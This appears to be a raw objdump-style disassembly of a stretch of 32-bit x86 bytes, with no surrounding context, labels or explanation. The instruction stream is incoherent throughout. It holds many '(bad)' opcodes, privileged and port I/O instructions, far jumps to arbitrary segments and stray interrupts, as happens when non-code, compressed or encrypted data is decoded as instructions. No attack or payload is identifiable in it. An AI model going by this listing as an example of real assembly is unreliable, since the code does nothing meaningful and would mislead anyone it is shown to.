  442b4e:	sti    
  442b4f:	mul    dh
  442b51:	jae    0x442af0
  442b53:	dec    esp
  442b54:	in     al,0x12
  442b56:	jmp    0xe7d7990
  442b5b:	cmp    al,0x34
  442b5d:	gs es out 0x40,al
  442b61:	dec    ebp
  442b62:	mov    ah,0xf0
  442b64:	jg     0x442b7d
  442b66:	mov    al,0xf8
  442b68:	mov    dh,bl
  442b6a:	jnp    0x442b4d
  442b6c:	stos   BYTE PTR es:[edi],al
  442b6d:	div    BYTE PTR [ebp+0x19848e81]
  442b73:	push   ds
  442b74:	jmp    0xbfc1:0xa02f3636
  442b7b:	add    al,0xc8
  442b7d:	shl    BYTE PTR [esi-0x45],cl
  442b80:	inc    ebp
  442b81:	leave  
  442b82:	mov    eax,ds:0x51c151e6
  442b87:	(bad)  
  442b88:	or     DWORD PTR [ebx+0x2d17cd99],edi
  442b8e:	adc    esp,DWORD PTR [edx-0x78]
  442b91:	jge    0x442b89
  442b93:	jmp    esi
  442b95:	ficomp WORD PTR [eax+0x5a911b7b]
  442b9b:	inc    esp
  442b9c:	cli    
  442b9d:	sub    al,0x40
  442b9f:	call   0x28b2:0x24b76e1c
  442ba6:	sbb    esi,edx
  442ba8:	mov    dh,0xe1
  442baa:	shl    BYTE PTR ds:0xb007a73d,0xd2
  442bb1:	jg     0x442ba6
  442bb3:	mov    edi,0xe4be6b84
  442bb8:	mov    DWORD PTR [eax+0x3946825b],esi
  442bbe:	hlt    
  442bbf:	adc    eax,0xa842389
  442bc4:	and    eax,0xee33516
  442bc9:	mov    ds:0xc937983b,al
  442bce:	ret    0x69ed
  442bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442bd2:	fwait
  442bd3:	popf   
  442bd4:	jle    0x442b59
  442bd6:	jp     0x442c10
  442bd8:	or     al,0x67
  442bda:	mov    eax,0xc171f3bc
  442bdf:	add    al,0x7e
  442be1:	retf   0xe1f
  442be4:	jae    0x442bbc
  442be6:	repnz xchg ebx,eax
  442be8:	xchg   BYTE PTR [eax],dl
  442bea:	or     BYTE PTR ds:0x57b44a37,dl
  442bf0:	shl    DWORD PTR [eax+edi*4-0x4f],1
  442bf4:	lea    ecx,[eax]
  442bf6:	fst    QWORD PTR [eax+edi*4+0x724a879d]
  442bfd:	cdq    
  442bfe:	mov    edi,ebx
  442c00:	popf   
  442c01:	mov    BYTE PTR [ecx],cl
  442c03:	rcl    DWORD PTR [ecx-0x235e2439],1
  442c09:	mov    DWORD PTR [edx+0x1c],ebp
  442c0c:	dec    ebx
  442c0d:	les    ebp,FWORD PTR [ecx+eax*2+0x6ec5684b]
  442c14:	push   esp
  442c15:	mov    ds:0xb15b64bc,al
  442c1a:	push   esi
  442c1b:	ja     0x442c22
  442c1d:	stc    
  442c1e:	mov    ebp,0xbdfe304
  442c23:	sbb    eax,0xf2acfc95
  442c28:	pop    edx
  442c29:	mov    ah,0x2f
  442c2b:	push   es
  442c2c:	(bad)
  442c30:	push   es
  442c31:	push   eax
  442c32:	mov    ds:0xeb231897,eax
  442c37:	jmp    0x442c6a
  442c39:	mov    ds:0x8b9b8fab,al
  442c3e:	mov    ah,0xb1
  442c40:	cwde   
  442c41:	pop    eax
  442c42:	pop    eax
  442c43:	mov    esp,edx
  442c45:	mov    ds:0x29e0386b,al
  442c4a:	cmp    esi,ecx
  442c4c:	pop    edx
  442c4d:	pushf  
  442c4e:	sbb    edx,DWORD PTR [ebx+0x39]
  442c51:	outs   dx,DWORD PTR ds:[esi]
  442c52:	add    esp,ebp
  442c54:	rol    DWORD PTR [ecx],1
  442c56:	push   edi
  442c57:	adc    al,0xd0
  442c59:	mov    al,ds:0xe836f893
  442c5e:	pop    ecx
  442c5f:	push   0xffffff90
  442c61:	sahf   
  442c62:	fwait
  442c63:	or     DWORD PTR [edx-0x3e],ebx
  442c66:	ins    DWORD PTR es:[edi],dx
  442c67:	stc    
  442c68:	out    dx,eax
  442c69:	(bad)  
  442c6a:	ror    ah,1
  442c6c:	sub    al,0x22
  442c6e:	mov    esp,0xccea9684
  442c73:	test   DWORD PTR [ebp+0x14],edi
  442c76:	mov    esp,0x7f6c77a5
  442c7b:	xchg   ecx,eax
  442c7c:	inc    edi
  442c7d:	sbb    ecx,edi
  442c7f:	call   0x7a8b8521
  442c84:	in     eax,0x2f
  442c86:	mov    ebp,0xe4573f64
  442c8b:	pmaddwd mm1,QWORD PTR [esi+0x1d7ef89a]
  442c92:	rcl    dl,0x61
  442c95:	push   0xf6a3e8cf
  442c9a:	adc    DWORD PTR [esi+0x30bfe7f4],0xffffffb9
  442ca1:	mov    eax,ds:0xdb0549b
  442ca6:	mov    edx,0x12131229
  442cab:	leave  
  442cac:	sub    DWORD PTR [eax-0x4e],edx
  442caf:	test   BYTE PTR [ebp+0x450da7f6],ah
  442cb5:	ror    DWORD PTR [esi],cl
  442cb7:	jmp    0x1c3d03f3
  442cbc:	and    ebx,ecx
  442cbe:	pop    edi
  442cbf:	dec    esp
  442cc0:	cld    
  442cc1:	call   0x9c128230
  442cc6:	imul   ecx,DWORD PTR [edi+0x166368da],0xfffffff0
  442ccd:	pop    edx
  442cce:	xor    DWORD PTR [ebx],ecx
  442cd0:	mov    ah,0x36
  442cd2:	mov    esi,0x69469594
  442cd7:	enter  0x98c7,0x72
  442cdb:	dec    ecx
  442cdc:	jbe    0x442c65
  442cde:	mov    esi,0x1d73815d
  442ce3:	repnz push es
  442ce5:	xor    DWORD PTR [edx+0x1b],esp
  442ce8:	fdivp  st(5),st
  442cea:	mov    al,0x14
  442cec:	and    bl,al
  442cee:	int3   
  442cef:	jne    0xa32dbf9d
  442cf5:	scas   al,BYTE PTR es:[edi]
  442cf6:	mov    dl,0xa2
  442cf8:	xchg   edi,eax
  442cf9:	push   0xffffffe1
  442cfb:	sbb    BYTE PTR [edi],dh
  442cfd:	cmc    
  442cfe:	iret   
  442cff:	push   edi
  442d00:	adc    eax,0x34ee66c8
  442d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442d06:	or     al,0xdf
  442d08:	xor    eax,0x93befdc9
  442d0d:	mov    dh,0x14
  442d0f:	loope  0x442d3b
  442d11:	aad    0x8c
  442d13:	or     eax,0xc3bc923f
  442d18:	dec    ebp
  442d19:	mov    DWORD PTR [edi-0x499ce4a2],esp
  442d1f:	or     bh,dh
  442d21:	jmp    0x9d21f5db
  442d26:	(bad)  
  442d27:	outs   dx,BYTE PTR ds:[esi]
  442d28:	pop    ebp
  442d29:	mov    edx,0xac5f4f4
  442d2e:	push   ds
  442d2f:	jmp    0x1f376e51
  442d34:	and    BYTE PTR [ecx-0x5d5de429],bl
  442d3a:	adc    eax,0x4b9c9c41
  442d3f:	dec    esp
  442d40:	add    eax,0xcb36fd18
  442d45:	inc    esi
  442d46:	mov    eax,ds:0xb7290702
  442d4b:	fs pop eax
  442d4d:	addr16 repz add al,0x57
  442d51:	xchg   edx,eax
  442d52:	das    
  442d53:	mov    dl,0x69
  442d55:	int    0x43
  442d57:	hlt    
  442d58:	loopne 0x442cf6
  442d5a:	jecxz  0x442d21
  442d5c:	xlat   BYTE PTR ds:[ebx]
  442d5d:	push   ecx
  442d5e:	mov    edi,0xc3590194
  442d63:	mov    al,ds:0x646b9f8d
  442d68:	mov    gs,ecx
  442d6a:	pushf  
  442d6b:	in     eax,dx
  442d6c:	in     eax,dx
  442d6d:	test   eax,0xaa55379b
  442d72:	mov    al,ds:0xfd9ad8b6
  442d77:	lods   al,BYTE PTR ds:[esi]
  442d78:	dec    ecx
  442d79:	push   edi
  442d7a:	mov    al,0xa0
  442d7c:	inc    ebp
  442d7d:	and    DWORD PTR [esi-0x205a6f0c],ebp
  442d83:	in     al,0x23
  442d85:	sub    DWORD PTR [ebx+0x37361cbc],ebx
  442d8b:	mov    ebx,0xb0b9fdd
  442d90:	pop    es
  442d91:	and    ebx,DWORD PTR [edx-0x6cb4910e]
  442d97:	sti    
  442d98:	test   al,0x5
  442d9a:	mov    bh,0xc4
  442d9c:	push   ecx
  442d9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442d9e:	add    DWORD PTR [eax-0x4c070137],ebx
  442da4:	loope  0x442e1f
  442da6:	mov    ah,0xfc
  442da8:	mov    ecx,esi
  442daa:	retf   0xaaef
  442dad:	sbb    DWORD PTR [edx+0x1b5e2f65],ebx
  442db3:	jmp    0xf839:0x43234ff4
  442dba:	rcl    edi,cl
  442dbc:	std    
  442dbd:	call   0xabe9:0x61f4f7b
  442dc4:	sbb    ebp,ecx
  442dc6:	jmp    0x442da9
  442dc8:	jbe    0x442d54
  442dca:	mov    ah,0xa3
  442dcc:	push   cs
  442dcd:	test   al,0x9b
  442dcf:	stos   DWORD PTR es:[edi],eax
  442dd0:	ins    BYTE PTR es:[edi],dx
  442dd1:	outs   dx,DWORD PTR ds:[esi]
  442dd2:	push   cs
  442dd3:	push   eax
  442dd4:	add    ebp,edx
  442dd6:	xor    eax,0xee2639a2
  442ddb:	fs in  al,dx
  442ddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442dde:	fcomp  st(0)
  442de0:	pop    es
  442de1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442de2:	imul   ecx,DWORD PTR [esp+eax*2],0xffffffe8
  442de6:	or     ebx,DWORD PTR [eax+0x60d73260]
  442dec:	sbb    ebp,DWORD PTR [ecx+0x950831f]
  442df2:	cmp    al,0xfc
  442df4:	call   FWORD PTR [edx+0x1e81fc4b]
  442dfa:	cmp    al,BYTE PTR [ebp+0xa]
  442dfd:	or     al,0x8d
  442dff:	lds    ecx,FWORD PTR [edx-0x34e76c58]
  442e05:	mov    edi,eax
  442e07:	sbb    ch,BYTE PTR [ecx+0x109c0b9d]
  442e0d:	adc    bh,BYTE PTR [eax]
  442e0f:	or     ah,BYTE PTR [ebx+ebp*8]
  442e12:	push   edi
  442e13:	mov    cl,0xdd
  442e15:	jp     0x442dc8
  442e17:	or     dh,BYTE PTR [edx]
  442e19:	mov    ds:0x9c3eb955,al
  442e1e:	fistp  DWORD PTR [esi]
  442e20:	add    DWORD PTR [esi-0x43902fdd],eax
  442e26:	retf   
  442e27:	mov    ecx,0xe4b68bcf
  442e2c:	mov    ebp,gs
  442e2e:	push   eax
  442e2f:	dec    eax
  442e30:	(bad)  
  442e31:	fisttp QWORD PTR [ecx]
  442e33:	ficom  WORD PTR [esi]
  442e35:	push   ecx
  442e36:	and    DWORD PTR [esi],0x7cbaa001
  442e3c:	adc    bl,bh
  442e3e:	sbb    DWORD PTR [esi],esp
  442e40:	mov    bh,0x21
  442e42:	mov    ch,0x14
  442e44:	pop    esp
  442e45:	mov    ah,0x8b
  442e47:	jecxz  0x442e3d
  442e49:	cld    
  442e4a:	rol    BYTE PTR [edx+eax*8+0x22193ae4],1
  442e51:	or     DWORD PTR [ebx-0x49b11999],edi
  442e57:	jmp    0xf63fd383
  442e5c:	jge    0x442ed6
  442e5e:	sbb    eax,0x460ca57e
  442e63:	cmp    dl,bh
  442e65:	dec    ecx
  442e66:	mov    edi,0x7487bd2f
  442e6b:	das    
  442e6c:	and    al,0xf1
  442e6e:	jo     0x442e72
  442e70:	pop    edx
  442e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442e72:	call   0x89f3:0xed16e508
  442e79:	jne    0x442e0b
  442e7b:	(bad)  
  442e7c:	jmp    0x442ece
  442e7e:	xor    bh,dl
  442e80:	and    edi,DWORD PTR [ecx-0x5bd3cc42]
  442e86:	(bad)  
  442e87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442e88:	add    DWORD PTR [edx-0x4bf3a305],ebx
  442e8e:	call   0x3afb6a65
  442e93:	test   BYTE PTR [ecx-0x17a79c5e],cl
  442e99:	jmp    0xc8a14499
  442e9e:	mov    esi,esi
  442ea0:	xchg   BYTE PTR [esi-0x70],bl
  442ea3:	fistp  WORD PTR [edi+ebx*8]
  442ea6:	std    
  442ea7:	sbb    DWORD PTR ds:0xe3494609,0x428ab586
  442eb1:	xchg   esi,eax
  442eb2:	int    0x26
  442eb4:	fstp   QWORD PTR [edi+ebx*8+0x7cf1d99d]
  442ebb:	repz sub dl,BYTE PTR [eax]
  442ebe:	and    DWORD PTR [edx+0x6],esp
  442ec1:	arpl   WORD PTR [ebx-0x33723c8c],di
  442ec7:	or     al,0x3c
  442ec9:	jae    0x442ef5
  442ecb:	(bad)  
  442ecc:	mov    al,ds:0xe7917d
  442ed1:	sti    
  442ed2:	mov    ebp,0xdf39fde4
  442ed7:	jmp    0x442f3e
  442ed9:	pop    es
  442eda:	xor    eax,0xa7ee1933
  442ee0:	and    bh,BYTE PTR [ecx+0x27]
  442ee3:	icebp  
  442ee4:	xchg   esi,eax
  442ee5:	xchg   DWORD PTR [esi+0x3f],edi
  442ee8:	in     eax,dx
  442ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442eea:	retf   
  442eeb:	push   ecx
  442eec:	adc    ecx,DWORD PTR [esi]
  442eee:	xor    al,0x6
  442ef0:	in     eax,dx
  442ef1:	mov    BYTE PTR [esi+esi*2-0x3],dh
  442ef5:	(bad)  
  442ef6:	mov    esi,0x5c597254
  442efb:	fiadd  DWORD PTR [ebp+0x2512dc8a]
  442f01:	sub    esi,DWORD PTR [edi-0x24]
  442f04:	pop    es
  442f05:	sbb    BYTE PTR [edx-0x38792491],ah
  442f0b:	fisub  DWORD PTR ds:0x11348990
  442f11:	mov    esi,DWORD PTR [eax+ebx*2]
  442f14:	pop    ebx
  442f15:	fwait
  442f16:	jge    0x442eab
  442f18:	ret    
  442f19:	mov    edx,DWORD PTR [ebp+0x4b9c10ee]
  442f1f:	jmp    0x6a776f4e
  442f24:	call   0xc1ea9449
  442f29:	repnz mov ebx,0x97c16ab4
  442f2f:	sub    BYTE PTR [ebp-0x1a],ah
  442f32:	push   ecx
  442f33:	out    0xa6,eax
  442f35:	stc    
  442f36:	in     eax,dx
  442f37:	mov    dl,0x51
  442f39:	leave  
  442f3a:	aas    
  442f3b:	cmc    
  442f3c:	xchg   BYTE PTR ds:0xa46f5aca,ch
  442f42:	ja     0x442edc
  442f44:	pop    ebx
  442f45:	lahf   
  442f46:	imul   ebp,edi,0xfffffff5
  442f49:	push   0x11
  442f4b:	inc    esp
  442f4c:	div    DWORD PTR [edx+0x3e]
  442f4f:	fistp  DWORD PTR [edi]
  442f51:	jmp    0x442f35
  442f53:	je     0x442ef0
  442f55:	and    DWORD PTR [esi+ecx*2-0x15558135],esp
  442f5c:	cmc    
  442f5d:	push   es
  442f5e:	fucomp st(6)
  442f60:	shr    DWORD PTR [ecx],0xa2
  442f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442f64:	mov    ds:0x55ab9d5e,al
  442f69:	lock dec ebp
  442f6b:	div    DWORD PTR [esi]
  442f6d:	dec    ebp
  442f6e:	jg     0x442f7b
  442f70:	loop   0x442f13
  442f72:	sti    
  442f73:	and    BYTE PTR [edi],bl
  442f75:	retf   0x8772
  442f78:	jl     0x442fdd
  442f7a:	jmp    0xc44:0xeabb2f04
  442f81:	and    edx,DWORD PTR [esi+0x5ba0a270]
  442f87:	pop    esp
  442f88:	sti    
  442f89:	popa   
  442f8a:	mov    ecx,DWORD PTR [ebp+0xf]
  442f8d:	cmovle edx,ebx
  442f90:	add    bh,al
  442f92:	lods   al,BYTE PTR ds:[esi]
  442f93:	jbe    0x442f96
  442f95:	cmp    BYTE PTR [esp+ebp*4-0x3ec46000],bh
  442f9c:	jb     0x442f94
  442f9e:	jae    0x442fbf
  442fa0:	les    esi,FWORD PTR [esi+0xe8d20ad]
  442fa6:	mov    ah,0x64
  442fa8:	pop    ds
  442fa9:	xchg   ebp,eax
  442faa:	xchg   esp,eax
  442fab:	lahf   
  442fac:	out    0x30,al
  442fae:	push   ds
  442faf:	rcr    BYTE PTR [edx],1
  442fb1:	jae    0x442fa9
  442fb3:	pop    ds
  442fb4:	xchg   edi,eax
  442fb5:	out    dx,eax
  442fb6:	jl     0x442f62
  442fb8:	jmp    0xf78:0xebba3ba3
  442fbf:	test   DWORD PTR [esi+0x64],edx
  442fc2:	ret    
  442fc3:	dec    edx
  442fc4:	sub    eax,edx
  442fc6:	mov    esp,0xbbac12cf
  442fcb:	sbb    al,0x8a
  442fcd:	mov    cl,0x80
  442fcf:	xchg   ebp,eax
  442fd0:	xor    BYTE PTR [bx-0xa],dh
  442fd4:	cdq    
  442fd5:	dec    eax
  442fd6:	mov    ebp,0xfba32078
  442fdb:	lock ds fwait
  442fde:	call   0x50733250
  442fe3:	stc    
  442fe4:	sbb    al,0xe9
  442fe6:	jge    0x442fbb
  442fe8:	call   0x7d03c905
  442fed:	push   0xd
  442fef:	mov    ebx,0x95dfa18c
  442ff4:	ins    BYTE PTR es:[edi],dx
  442ff5:	xchg   BYTE PTR [esi+0x1d],bh
  442ff8:	dec    DWORD PTR [esp+eiz*2+0x10]
  442ffc:	inc    BYTE PTR [ebx+0x74]
  442fff:	and    ch,BYTE PTR [eax+edx*1]
  443002:	push   es
  443003:	lds    esp,FWORD PTR [edi-0x14463ec9]
  443009:	popf   
  44300a:	jnp    0x44302e
  44300c:	call   0x54d3:0x4e1f551c
  443013:	dec    edx
  443014:	arpl   WORD PTR [esp+esi*4],bp
  443017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443018:	add    bh,dh
  44301a:	stos   BYTE PTR es:[edi],al
  44301b:	mov    al,ds:0xe4cb5645
  443020:	in     al,0x2d
  443022:	int    0xc2
  443024:	mov    ch,0xc9
  443026:	dec    esi
  443027:	nop
  443028:	push   cs
  443029:	shr    DWORD PTR ds:0x9b5487bb,1
  44302f:	retf   
  443030:	das    
  443031:	test   DWORD PTR [edi],eax
  443033:	icebp  
  443034:	mov    ch,0x64
  443036:	fcomi  st,st(3)
  443038:	test   DWORD PTR [edi+0x3b],esi
  44303b:	and    BYTE PTR [edi],ch
  44303d:	or     DWORD PTR [esp+edx*8],esp
  443040:	inc    edx
  443041:	popf   
  443042:	mov    eax,0x8107658e
  443047:	jo     0x443010
  443049:	mov    cl,bh
  44304b:	and    esi,DWORD PTR [ebx-0x29]
  44304e:	pushf  
  44304f:	out    0x5a,al
  443051:	fs mov dl,0xa4
  443054:	loop   0x4430bd
  443056:	cmc    
  443057:	sti    
  443058:	aad    0xce
  44305a:	jbe    0x443041
  44305c:	jmp    0x8169:0x20385155
  443063:	or     DWORD PTR [esi+0x45],ecx
  443066:	into   
  443067:	sbb    BYTE PTR [esi],ch
  443069:	cdq    
  44306a:	sbb    esp,ebx
  44306c:	outs   dx,DWORD PTR ds:[esi]
  44306d:	adc    edi,DWORD PTR [edx+0xe5453e1]
  443073:	cld    
  443074:	mov    ah,0xfe
  443076:	mov    esi,0xec0b6a34
  44307b:	ins    DWORD PTR es:[edi],dx
  44307c:	or     BYTE PTR [ebp-0x7c0ac049],bh
  443082:	mov    dh,0x84
  443084:	and    ecx,DWORD PTR [ecx]
  443086:	push   ebp
  443087:	mov    dh,0x8c
  443089:	arpl   cx,dx
  44308b:	jg     0x443083
  44308d:	pop    esp
  44308e:	pmaxsw mm4,QWORD PTR [ecx+esi*8]
  443092:	xchg   edi,eax
  443093:	sbb    eax,0x8b8328de
  443098:	and    eax,0xce130099
  44309d:	push   eax
  44309e:	outs   dx,DWORD PTR ds:[esi]
  44309f:	scas   eax,DWORD PTR es:[edi]
  4430a0:	mov    esi,0x4e29eba6
  4430a5:	nop
  4430a6:	mov    edx,esp
  4430a8:	sub    ebp,DWORD PTR [edx+0x26]
  4430ab:	push   0x5ac25b1
  4430b0:	fstp   DWORD PTR [ebp+0x3a]
  4430b3:	hlt    
  4430b4:	xchg   ecx,eax
  4430b5:	mov    ds:0x86006fab,al
  4430ba:	int    0x49
  4430bc:	inc    ebp
  4430bd:	mov    ecx,0x44016f8
  4430c2:	(bad)  
  4430c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4430c4:	iret   
  4430c5:	inc    ebp
  4430c6:	mov    BYTE PTR [eax-0x7d02e827],cl
  4430cc:	jl     0x443069
  4430ce:	sbb    edx,DWORD PTR [ebx]
  4430d0:	or     al,0xb5
  4430d2:	ins    DWORD PTR es:[edi],dx
  4430d3:	cmc    
  4430d4:	or     al,0xea
  4430d6:	div    BYTE PTR [edi]
  4430d8:	aas    
  4430d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4430da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4430db:	lods   al,BYTE PTR ds:[esi]
  4430dc:	push   cs
  4430dd:	call   0x1c95:0xee876eb2
  4430e4:	push   dx
  4430e6:	sub    al,0x5e
  4430e8:	mov    eax,0x18e8f997
  4430ed:	sbb    DWORD PTR [ecx],eax
  4430ef:	sub    eax,0x9bff5240
  4430f4:	stos   BYTE PTR es:[edi],al
  4430f5:	mov    ds:0x6eec888b,al
  4430fa:	mov    ah,bl
  4430fc:	repz inc esi
  4430fe:	xchg   ecx,eax
  4430ff:	(bad)
  443104:	pop    ebp
  443105:	fcom   DWORD PTR ds:0xea321510
  44310b:	repz adc BYTE PTR [ecx-0x46e7eebc],bh
  443112:	lahf   
  443113:	cmp    al,0x63
  443115:	xor    esi,DWORD PTR [ecx+0x49]
  443118:	jge    0x4430ba
  44311a:	push   edx
  44311b:	jmp    0x443122
  44311d:	mov    ah,BYTE PTR [esi-0x12]
  443120:	int3   
  443121:	test   DWORD PTR [edi-0x12],ecx
  443124:	and    al,dh
  443126:	xchg   BYTE PTR [edi+0x4b],dl
  443129:	add    al,0x20
  44312b:	test   DWORD PTR ds:0x2879f778,esp
  443131:	fs jge 0x44318a
  443134:	pop    eax
  443135:	int3   
  443136:	pop    ebx
  443137:	sub    DWORD PTR [eax-0x36],ebp
  44313a:	sub    al,0xb3
  44313c:	bound  edx,QWORD PTR [ecx]
  44313e:	and    al,0xf1
  443140:	and    ebp,DWORD PTR [ecx+0x29]
  443143:	sbb    bh,BYTE PTR [ebp+0x7a]
  443146:	imul   esi,DWORD PTR [ecx+eiz*1+0x7fb20d5a],0xa540cfb3
  443151:	imul   ecx,DWORD PTR [ebx],0x6
  443154:	test   BYTE PTR [eax-0x8671658],dl
  44315a:	fwait
  44315b:	push   esi
  44315c:	iret   
  44315d:	je     0x44310f
  44315f:	adc    dh,dh
  443161:	bound  ebp,QWORD PTR [edx]
  443163:	mov    esi,0xaa4f5bc8
  443168:	cmc    
  443169:	push   cs
  44316a:	ja     0x443153
  44316c:	int    0xf8
  44316e:	mov    edx,0xb9f7cbfc
  443173:	add    al,0x59
  443175:	mov    bh,BYTE PTR [edx-0x5f9b9a7b]
  44317b:	hlt    
  44317c:	cmp    DWORD PTR [ebx],esi
  44317e:	and    BYTE PTR ss:[eax+0x55d11f6e],ah
  443185:	sub    DWORD PTR [ebx],0xfffffff4
  443188:	xchg   ecx,eax
  443189:	xor    ch,BYTE PTR [edx-0x52]
  44318c:	cmp    DWORD PTR [edx-0x56e73932],esp
  443192:	sahf   
  443193:	mov    BYTE PTR [esi+eiz*8-0x16de9e8b],ch
  44319a:	mov    esi,0x64e118bd
  44319f:	es jmp 0x44313c
  4431a2:	shl    DWORD PTR [ebx],1
  4431a4:	lods   al,BYTE PTR ds:[esi]
  4431a5:	outs   dx,DWORD PTR ds:[esi]
  4431a6:	dec    esi
  4431a7:	das    
  4431a8:	sbb    ebp,ecx
  4431aa:	or     esi,DWORD PTR [eax+0x1d761dd]
  4431b0:	adc    eax,0xa1e48d94
  4431b5:	popf   
  4431b6:	pop    edi
  4431b7:	je     0x443154
  4431b9:	aaa    
  4431ba:	arpl   WORD PTR [eax+0x68cdf988],cx
  4431c0:	pop    eax
  4431c1:	call   0xf066d9c2
  4431c6:	and    eax,0xab9c7498
  4431cb:	and    dl,dl
  4431cd:	dec    eax
  4431ce:	dec    eax
  4431cf:	push   0x15
  4431d1:	and    BYTE PTR [edx+0x50],ah
  4431d4:	and    bl,BYTE PTR [eax-0x73c94b46]
  4431da:	xchg   BYTE PTR [edx-0x18340c9b],bl
  4431e0:	jae    0x4431ba
  4431e2:	xchg   ecx,eax
  4431e3:	ficom  DWORD PTR [edi]
  4431e5:	pop    ecx
  4431e6:	loopne 0x4431ea
  4431e8:	xchg   ecx,eax
  4431e9:	cld    
  4431ea:	or     BYTE PTR [ecx-0xe],cl
  4431ed:	daa    
  4431ee:	dec    edi
  4431ef:	or     ebx,DWORD PTR [edx]
  4431f1:	jno    0x443220
  4431f3:	sbb    eax,0x1abdcf06
  4431f8:	pop    ds
  4431f9:	jns    0x4431f3
  4431fb:	or     eax,0xca286640
  443200:	pop    ss
  443201:	scas   al,BYTE PTR es:[edi]
  443202:	mov    ebx,0xfaa8603e
  443207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443208:	into   
  443209:	fs stc 
  44320b:	pop    es
  44320c:	xchg   ebx,eax
  44320d:	lock mov dl,0x4b
  443210:	pop    edi
  443211:	in     eax,dx
  443212:	mov    ch,0x44
  443214:	mov    al,ds:0xa611318d
  443219:	lods   eax,DWORD PTR ds:[esi]
  44321a:	pop    ecx
  44321b:	fbstp  TBYTE PTR [edi+ebp*2]
  44321e:	in     eax,0xd0
  443220:	xchg   BYTE PTR [ecx+ebp*2+0x16],ah
  443224:	sbb    al,0xe9
  443226:	or     BYTE PTR [eax+ecx*8+0x2c795dc5],dl
  44322d:	cdq    
  44322e:	cmp    esp,DWORD PTR [eax-0x2]
  443231:	sar    DWORD PTR [ebx+0x18],0xb3
  443235:	int    0xff
  443237:	fidivr WORD PTR [eax-0x67]
  44323a:	mov    dl,0x54
  44323c:	mov    gs,WORD PTR [edx+eiz*8-0x77]
  443240:	gs shld edi,esp,0xb4
  443245:	push   esi
  443246:	enter  0x493f,0x59
  44324a:	pop    ds
  44324b:	cmp    DWORD PTR [esi+0x42762959],ecx
  443251:	in     eax,0x6e
  443253:	call   0x688ff167
  443258:	inc    esi
  443259:	mov    ebx,0x729141f
  44325e:	dec    ebp
  44325f:	lods   al,BYTE PTR ds:[esi]
  443260:	test   BYTE PTR [esi+ebx*1-0xf7b7b93],bh
  443267:	lds    esp,FWORD PTR gs:[ecx+esi*2-0x48d21511]
  44326f:	mov    bl,0x26
  443271:	push   eax
  443272:	sbb    edx,ecx
  443274:	in     al,0xa6
  443276:	jmp    0x443245
  443278:	mov    ebp,DWORD PTR [eax-0x3c]
  44327b:	cmp    cl,ch
  44327d:	push   0x4e
  44327f:	adc    ebx,DWORD PTR [esi]
  443281:	jge    0x44329e
  443283:	(bad)  
  443284:	in     eax,dx
  443285:	jle    0x4432fa
  443287:	(bad)  
  443289:	popf   
  44328a:	sahf   
  44328b:	mov    cl,0xce
  44328d:	push   0x966394b0
  443292:	in     eax,0x1e
  443294:	cs add al,0x96
  443297:	test   DWORD PTR [ebx],ebp
  443299:	mov    ebp,0xa804eaf0
  44329e:	mov    esi,DWORD PTR [edx+0x96cd4a8]
  4432a4:	pop    ss
  4432a5:	loope  0x4432a9
  4432a7:	(bad)  
  4432a8:	in     al,0x2f
  4432aa:	mov    esi,0xcddfab04
  4432af:	adc    eax,0x839bd04d
  4432b4:	inc    DWORD PTR [edx+0x75a40281]
  4432ba:	dec    esp
  4432bb:	sub    BYTE PTR [ebx],bl
  4432bd:	cdq    
  4432be:	or     dh,ch
  4432c0:	mov    ah,0xb2
  4432c2:	jge    0x443271
  4432c4:	aas    
  4432c5:	sub    DWORD PTR [ebp+0x5],0x78039a1c
  4432cc:	or     al,0x3b
  4432ce:	xor    ah,bl
  4432d0:	sbb    BYTE PTR [ecx-0x72102b79],cl
  4432d6:	retf   
  4432d7:	push   ebp
  4432d8:	popa   
  4432d9:	jo     0x44331a
  4432db:	or     al,0x2f
  4432dd:	mov    DWORD PTR [ebx-0x2b],esi
  4432e0:	pop    ecx
  4432e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4432e2:	jns    0x443291
  4432e4:	inc    esp
  4432e5:	sbb    al,0x16
  4432e7:	xor    esi,edi
  4432e9:	inc    esp
  4432ea:	xchg   ebx,eax
  4432eb:	clc    
  4432ec:	jne    0x443346
  4432ee:	mov    ebp,0x2c85cf74
  4432f3:	push   ss
  4432f4:	ja     0x4432a9
  4432f6:	adc    DWORD PTR [ebp-0x39],0x23b143a1
  4432fd:	push   esi
  4432fe:	out    0xa4,al
  443300:	or     ecx,DWORD PTR [edx-0x33f7768d]
  443306:	dec    ecx
  443307:	daa    
  443308:	dec    ebx
  443309:	sub    BYTE PTR [ecx],cl
  44330b:	sub    ch,BYTE PTR [edi+0x14]
  44330e:	pushf  
  44330f:	es and al,0x7f
  443312:	push   ebp
  443313:	das    
  443314:	lock mov esi,0xe4060c0a
  44331a:	mov    bl,0x98
  44331c:	xchg   esi,eax
  44331d:	cmp    ebp,DWORD PTR [esi+0x7c]
  443320:	jecxz  0x4432d0
  443322:	sar    DWORD PTR [ebx],0xc5
  443325:	push   es
  443326:	stc    
  443327:	in     eax,0xfb
  443329:	or     BYTE PTR ds:0xd9a82554,dh
  44332f:	in     al,dx
  443330:	or     eax,0x93cbdd5
  443335:	fwait
  443336:	push   0xfffffff9
  443338:	or     ah,BYTE PTR [ecx-0x75465835]
  44333e:	arpl   bx,bx
  443340:	sub    BYTE PTR [ebx],ah
  443342:	mov    esi,0xbbb43bde
  443347:	sub    al,0x67
  443349:	in     eax,dx
  44334a:	test   eax,0x47dad455
  44334f:	imul   ebx,DWORD PTR [eax+0x68],0xffffffcd
  443353:	lods   al,BYTE PTR ds:[esi]
  443354:	aas    
  443355:	stos   DWORD PTR es:[edi],eax
  443356:	mov    dh,0x24
  443358:	enter  0xa3dd,0x4b
